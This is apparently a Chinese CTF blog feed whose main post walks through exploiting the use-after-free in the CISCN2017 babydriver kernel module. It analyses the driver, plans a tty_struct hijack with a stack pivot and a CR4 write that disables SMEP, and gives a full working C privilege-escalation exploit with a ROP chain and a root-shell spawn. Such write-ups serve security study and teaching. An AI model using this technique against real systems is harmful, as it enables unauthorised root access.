class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span>      number<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span> cpp_type<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>      has_default_value<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> default_value<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>      message_type<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> enum_type<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> containing_type<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>      is_extension<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> extension_scope<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>      serialized_options<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>DESCRIPTOR<span class="token punctuation">,</span>  create_key<span class="token operator">=</span>_descriptor<span class="token punctuation">.</span>_internal_create_key<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span>  extensions<span class="token operator">=</span><span class="token punctuation">[</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span>  nested_types<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  enum_types<span class="token operator">=</span><span class="token punctuation">[</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span>  serialized_options<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>  is_extendable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>  syntax<span class="token operator">=</span><span class="token string">'proto2'</span><span class="token punctuation">,</span>  extension_ranges<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  oneofs<span class="token operator">=</span><span class="token punctuation">[</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span>  serialized_start<span class="token operator">=</span><span class="token number">25</span><span class="token punctuation">,</span>  serialized_end<span class="token operator">=</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token punctuation">)</span>DESCRIPTOR<span class="token punctuation">.</span>message_types_by_name<span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span> <span class="token operator">=</span> _MSG_sym_db<span class="token punctuation">.</span>RegisterFileDescriptor<span class="token punctuation">(</span>DESCRIPTOR<span class="token punctuation">)</span>msg <span class="token operator">=</span> _reflection<span class="token punctuation">.</span>GeneratedProtocolMessageType<span class="token punctuation">(</span><span class="token string">'msg'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>_message<span class="token punctuation">.</span>Message<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>  <span class="token string">'DESCRIPTOR'</span> <span class="token punctuation">:</span> _MSG<span class="token punctuation">,</span>  <span class="token string">'__module__'</span> <span class="token punctuation">:</span> <span class="token string">'x1nri_pb2'</span>  <span class="token comment"># @@protoc_insertion_point(class_scope:tutorial.msg)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>_sym_db<span class="token punctuation">.</span>RegisterMessage<span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token comment"># @@protoc_insertion_point(module_scope)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/EXP_FILE/eb74957d1f02605e6c0211d828d8d75a_MD5.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> 赛题 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Kernel Heap - Use After Free</title>
      <link href="/2023/12/01/Kernel%20Heap%20-%20Use%20After%20Free/"/>
      <url>/2023/12/01/Kernel%20Heap%20-%20Use%20After%20Free/</url>
      
        <content type="html"><![CDATA[<blockquote><p>参考文章：<a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#0x04-Kernel-Heap-Use-After-Free">【PWN.0x00】Linux Kernel Pwn I：Basic Exploit to Kernel Pwn in CTF - arttnba3’s blog</a></p></blockquote><h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>UAF 即 Use After Free，通常指的是<strong>对于释放后未重置的垂悬指针的利用</strong>，此前在用户态下的 heap 阶段对于 ptmalloc 的利用很多都是基于UAF漏洞进行进一步的利用。</p><p>在 CTF 当中，内核的“堆内存”主要指的是<code>线性映射区（direct mapping area）</code>，常用的分配函数 <code>kmalloc</code> 从此处分配内存，常用的分配器为 <code>slub</code>，若是在 kernel 中存在着垂悬指针，我们同样可以以此完成对 slab&#x2F;slub 内存分配器的利用，通过 Kernel UAF 完成提权。</p><h1 id="二、Kernel-Heap-首杀：CISCN2017-babydriver"><a href="#二、Kernel-Heap-首杀：CISCN2017-babydriver" class="headerlink" title="二、Kernel Heap 首杀：CISCN2017 - babydriver"></a>二、Kernel Heap 首杀：CISCN2017 - babydriver</h1><h2 id="一-程序分析"><a href="#一-程序分析" class="headerlink" title="(一)程序分析"></a>(一)程序分析</h2><h3 id="boot-sh"><a href="#boot-sh" class="headerlink" title="boot.sh"></a>boot.sh</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>qemu-system-x86_64 <span class="token parameter variable">-initrd</span> core.cpio <span class="token parameter variable">-kernel</span> bzImage <span class="token parameter variable">-append</span> <span class="token string">'console=ttyS0 root=/dev/ram oops=panic panic=1'</span> -enable-kvm <span class="token parameter variable">-monitor</span> /dev/null <span class="token parameter variable">-m</span> 128M <span class="token parameter variable">--nographic</span>  <span class="token parameter variable">-smp</span> <span class="token assign-left variable">cores</span><span class="token operator">=</span><span class="token number">1</span>,threads<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">-cpu</span> kvm64,+smep <span class="token parameter variable">-s</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>（好乱）<br>开了smep</p><h3 id="core-init"><a href="#core-init" class="headerlink" title="core&#x2F;init"></a>core&#x2F;init</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span> <span class="token function">mount</span> <span class="token parameter variable">-t</span> proc none /proc<span class="token function">mount</span> <span class="token parameter variable">-t</span> sysfs none /sys<span class="token function">mount</span> <span class="token parameter variable">-t</span> devtmpfs devtmpfs /dev<span class="token function">chown</span> root:root flag<span class="token function">chmod</span> <span class="token number">400</span> flag<span class="token builtin class-name">exec</span> <span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>/dev/console<span class="token builtin class-name">exec</span> <span class="token operator"><span class="token file-descriptor important">1</span>></span>/dev/console<span class="token builtin class-name">exec</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/consoleinsmod /lib/modules/4.4.72/babydriver.ko<span class="token function">chmod</span> <span class="token number">777</span> /dev/babydev<span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span>Boot took <span class="token variable"><span class="token variable">$(</span><span class="token function">cut</span> -d<span class="token string">' '</span> <span class="token parameter variable">-f1</span> /proc/uptime<span class="token variable">)</span></span> seconds<span class="token entity" title="\n">\n</span>"</span>setsid cttyhack setuidgid <span class="token number">1000</span> <span class="token function">sh</span><span class="token function">umount</span> /proc<span class="token function">umount</span> /syspoweroff <span class="token parameter variable">-d</span> <span class="token number">0</span>  <span class="token parameter variable">-f</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>LKMs的位置在 &#x2F;lib&#x2F;modules&#x2F;4.4.72&#x2F;babydriver.ko</p><h2 id="babydriver-ko"><a href="#babydriver-ko" class="headerlink" title="babydriver.ko"></a>babydriver.ko</h2><p><img src="/Binary_FILE/15c6f1e01eb1f04c1408e276bd16b4eb_MD5.jpeg"></p><p>只开了NX</p><h3 id="babydriver-init"><a href="#babydriver-init" class="headerlink" title="babydriver_init()"></a>babydriver_init()</h3><p>在驱动被加载时会初始化一个设备节点文件<code>/dev/babydev</code></p><p><img src="/Binary_FILE/e740437a883b83234d96a87bfdca07dd_MD5.jpeg"></p><h3 id="babyopen"><a href="#babyopen" class="headerlink" title="babyopen()"></a>babyopen()</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">babyopen</span><span class="token punctuation">(</span>inode <span class="token operator">*</span>inode<span class="token punctuation">,</span> file <span class="token operator">*</span>filp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">_fentry__</span><span class="token punctuation">(</span>inode<span class="token punctuation">,</span> filp<span class="token punctuation">)</span><span class="token punctuation">;</span>  babydev_struct<span class="token punctuation">.</span>device_buf <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">kmem_cache_alloc_trace</span><span class="token punctuation">(</span>kmalloc_caches<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0x24000C0LL</span><span class="token punctuation">,</span> <span class="token number">64LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  babydev_struct<span class="token punctuation">.</span>device_buf_len <span class="token operator">=</span> <span class="token number">64LL</span><span class="token punctuation">;</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"device open\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在我们使用open()打开设备文件时该驱动会分配一个64byte的chunk</p><blockquote><p>kmem_cache_alloc_trace函数是Linux内核中的一个函数，用于从特定的缓存获取对象<br>cachep：用于获取对象的缓存。<br>flags：精确描述分配特征的标志变量<br>size：获取的大小</p></blockquote><p>并将返回的堆指针和size放入以下的全局变量<code>babydev_struct</code>中：</p><p><img src="/Binary_FILE/e740437a883b83234d96a87bfdca07dd_MD5.jpeg"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">babydevice_t</span><span class="token punctuation">&#123;</span><span class="token keyword">char</span> <span class="token operator">*</span>device_buf<span class="token punctuation">;</span><span class="token class-name">size_t</span> device_buf_len<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="babyioctl"><a href="#babyioctl" class="headerlink" title="babyioctl()"></a>babyioctl()</h3><p><img src="/Binary_FILE/7e46fdaf779faf5fc8fcb85de40d09d3_MD5.jpeg"><br>使用 ioctl 进行通信则可以重新申请内存，释放掉原chunk，并重新申请自定义大小的chunk</p><h3 id="babyread"><a href="#babyread" class="headerlink" title="babyread()"></a>babyread()</h3><p><img src="/Binary_FILE/70eafb02991b24feb3758e4e02b721ec_MD5.jpeg"><br>反汇编有点问题，看下汇编，是在调用copy_from_user之前会检查device_buf_len是否大于用户要求的长度，否则不会执行<br><img src="/Binary_FILE/eb9c16005ae447ae1039ffc305017cb0_MD5.jpeg"><br>从kernel-&gt;user写数据</p><h3 id="babywrite"><a href="#babywrite" class="headerlink" title="babywrite()"></a>babywrite()</h3><p><img src="/Binary_FILE/5f01a206027d442a4b74073cbfdcbbde_MD5.jpeg"><br>同理，从user-&gt;kernel写数据</p><h3 id="babyrelease"><a href="#babyrelease" class="headerlink" title="babyrelease()"></a>babyrelease()</h3><p><img src="/Binary_FILE/ed4470c68c2f0d183268a0285384ee78_MD5.jpeg"></p><p>再关闭设备文件时释放掉了chunk，但是没有置空指针，存在UAF漏洞</p><h2 id="二-EXP"><a href="#二-EXP" class="headerlink" title="(二)EXP"></a>(二)EXP</h2><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>ropper看一下gadget：</p><ul><li>有swapgs和iretq</li><li>有<code>mov cr4, ...</code>的gadget，可以关闭SMEP保护<br><img src="/Binary_FILE/e2f64b05fb9f29bf8dfa5995fe749d39_MD5.jpeg"></li><li>内核函数表可读</li></ul><p>攻击思路：</p><ol><li>打开两个&#x2F;dev&#x2F;babydriver（分别为fd1、fd2），对fd1进行ioctl将size改为sizef(struct tty_struct)，并释放该chunk。由于UAF我们的fd2能够继续访问该freechunk</li><li>打开 &#x2F;dev&#x2F;ptmx，会分配一个tty_struct结构体（正好是释放掉的那个chunk），此时我们便可以通过fd2访问该chunk，即纂改<code>tty_struct-&gt;*ops</code>。又因为没开启SMAP我们便可以在用户态构造<code>fake tty_operations</code>写ropchain进行提权。</li><li>当然由于内核中没有one_gadget之类的东西，我们还需要进行栈迁移，将栈迁移到我们的fake tty_operations</li></ol><p>使用gdb进行调试，观察内核在调用我们的恶意函数指针时各寄存器的值，我们在这里选择劫持tty_operaionts结构体到用户态的栈上，并选择任意一条内核gadget作为fake tty函数（我选择的是babywrite）指针以方便下断点。</p><p>在我们调用<code>tty_operations-&gt;write</code>时，<strong>其rax寄存器中存放的便是tty_operations结构体的地址</strong>：<br><img src="/Binary_FILE/dd37b28b274e3f7a2fb63fd82c64b1f1_MD5.jpeg"></p><p>因此若是我们能够在内核中找到形如<code>mov rsp, rax</code>的gadget，便能够成功地将栈迁移到<code>tty_operations</code>结构体的开头：</p><blockquote><p>这里同时使用了ropper和ROPgadget，两者找到的gadget有差异<br><img src="/Binary_FILE/4435e3a3df63acd20410447f48fb8f22_MD5.jpeg"></p></blockquote><p><img src="/Binary_FILE/ddfa82852870c81106e9705cdf04d1ef_MD5.jpeg"><br>可见<code>jmp 0xffffffff8181bf7e;</code>即<code>ret;</code>，我们便选择<code>0xffffffff8181bfc5 : mov rsp, rax ; dec ebx ; jmp 0xffffffff8181bf7e</code>作为我们栈劫持的gadget</p><ol start="4"><li>现在我们将栈劫持到了fake_ops顶端，不过由于fake_ops离write距离太小不够塞入ropchain，我们需要再一次进行栈劫持</li></ol><p><img src="/Binary_FILE/05e66dd3273fbb72ee433dffaeb7ea51_MD5.jpeg"></p><ol start="5"><li>将栈劫持到rop上，完成利用</li></ol><p>补充：<br>一开始出现出现这样的报错<br><img src="/Binary_FILE/b7b2c535dcbcd5a0a0e19d992057bf93_MD5.jpeg"><br>查了一些资料过后，发现很可能是<code>PTI</code>保护机制的问题，在尝试关闭<code>PTI</code>无果之后，发现其实可以通过对特定<code>signal</code>的处理来继续完成利用，比如说<code>PTI</code>机制这里会抛出的11号信号，给他处理成<code>getRootshell</code>这个函数就行了，因为在这之前已经完成了bypass smep和<code>prepare_kernel_cred(commit_creds(0))</code>的操作。</p><p>（本来想用<code>swapgs_restore_regs_and_return_to_usermode</code>的，不过这个题内核版本4.4.72太老了，貌似还并没有引进这个函数）</p><h3 id="自写exp"><a href="#自写exp" class="headerlink" title="自写exp"></a>自写exp</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SWAPGS_POP_RBP_RET</span> <span class="token expression"><span class="token number">0xffffffff81063694</span><span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IRETQ_RET</span> <span class="token expression"><span class="token number">0xffffffff814e35ef</span><span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MOV_CR4_RDI_POP_RBP_RET</span> <span class="token expression"><span class="token number">0xffffffff81004d80</span><span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RDI_RET</span> <span class="token expression"><span class="token number">0xffffffff810d238d</span><span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RSP_RET</span> <span class="token expression"><span class="token number">0xffffffff81171045</span><span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MOV_RSP_RAX_DEC_EBX_RET</span> <span class="token expression"><span class="token number">0xffffffff8181bfc5</span><span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RAX_RSP</span> <span class="token expression"><span class="token number">0xffffffff8100ce6e</span><span class="token punctuation">;</span> </span></span><span class="token class-name">size_t</span> commit_creds_addr <span class="token operator">=</span> <span class="token number">0xffffffff810a1420</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> prepare_kernel_cred_addr <span class="token operator">=</span> <span class="token number">0xffffffff810a1810</span><span class="token punctuation">;</span><span class="token comment">/*user_cs;user_rflags;user_sp;user_ss;*/</span><span class="token class-name">size_t</span> user_cs<span class="token punctuation">,</span>user_ss<span class="token punctuation">,</span>user_sp<span class="token punctuation">,</span>user_rflags<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>__asm__ <span class="token function">__volatile__</span><span class="token punctuation">(</span><span class="token string">"mov user_cs,cs;"</span><span class="token string">"mov user_ss,ss;"</span><span class="token string">"mov user_sp,rsp;"</span><span class="token string">"pushf;"</span><span class="token string">"pop user_rflags;"</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Success to saveStatus!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] Error : %s\033[0m\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31;37m[+] &lt;Successfully Get Root Privileges>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] &lt;Get Root Error>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">getRootRrivilege</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">void</span><span class="token operator">*</span> <span class="token punctuation">(</span><span class="token operator">*</span>prepare_kernel_cred<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">=</span> prepare_kernel_cred_addr<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>commit_creds<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">=</span> commit_creds_addr<span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token operator">*</span>commit_creds<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>prepare_kernel_cred<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">signal</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>getRootShell<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/*fd2 control tty_struct*/</span><span class="token keyword">int</span> fd1 <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/babydev"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fd1<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"Failed to open fd1!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> fd2 <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/babydev"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fd2<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"Failed to open fd2!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">ioctl</span><span class="token punctuation">(</span>fd1<span class="token punctuation">,</span> <span class="token number">0x10001</span><span class="token punctuation">,</span> <span class="token number">0x2e0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>fd1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> tty_fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/ptmx"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>tty_fd<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"Failed to open tty_fd!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">size_t</span> rop<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> i <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">/*bypass SMAP*/</span>rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RDI_RET<span class="token punctuation">;</span>rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0x6f0</span><span class="token punctuation">;</span>rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>MOV_CR4_RDI_POP_RBP_RET<span class="token punctuation">;</span>rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">/*getroot*/</span>rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>getRootRrivilege<span class="token punctuation">;</span>rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>SWAPGS_POP_RBP_RET<span class="token punctuation">;</span>rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>IRETQ_RET<span class="token punctuation">;</span>rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>getRootShell<span class="token punctuation">;</span>rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_cs<span class="token punctuation">;</span>rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rflags<span class="token punctuation">;</span>rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_sp<span class="token punctuation">;</span>rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_ss<span class="token punctuation">;</span><span class="token class-name">size_t</span> fake_tty_struct<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> fake_ops<span class="token punctuation">[</span><span class="token number">0x20</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token function">read</span><span class="token punctuation">(</span>fd2<span class="token punctuation">,</span> fake_tty_struct<span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fake_tty_struct<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span>fake_ops<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] fake_ops_addr: %p\n"</span><span class="token punctuation">,</span> fake_ops<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span>fd2<span class="token punctuation">,</span> fake_tty_struct<span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fake_ops<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> MOV_RSP_RAX_DEC_EBX_RET <span class="token punctuation">;</span>fake_ops<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> POP_RSP_RET<span class="token punctuation">;</span>fake_ops<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> rop<span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span>tty_fd<span class="token punctuation">,</span> <span class="token string">"X1NRI"</span><span class="token punctuation">,</span> <span class="token number">0x5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" 